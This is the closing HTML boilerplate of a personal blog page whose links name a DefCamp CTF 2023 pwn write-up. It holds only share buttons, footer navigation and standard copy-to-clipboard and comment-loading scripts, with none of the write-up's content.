  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&is_video=false&description=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)&body=Check out this article: https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&title=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&title=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&title=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&title=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&name=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/231023-d-ctf2023-ALL_PWN/&t=DefCamp Capture the Flag (D-CTF) 2023 Write ups (all pwn)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2022-2025
    HyeonJi Son
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->
 
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="far fa-clone"></i>';
    btn += '</span>'; 
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Google Analytics -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Umami Analytics -->

<!-- Disqus Comments -->

    <script type="text/javascript">
        var disqus_shortname = 'jiravvit-github-io';

        (function(){
            var dsq = document.createElement('script');
            dsq.type = 'text/javascript';
            dsq.async = true;
            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
        }());
    </script>

<!-- utterances Comments -->

</body>
</html>
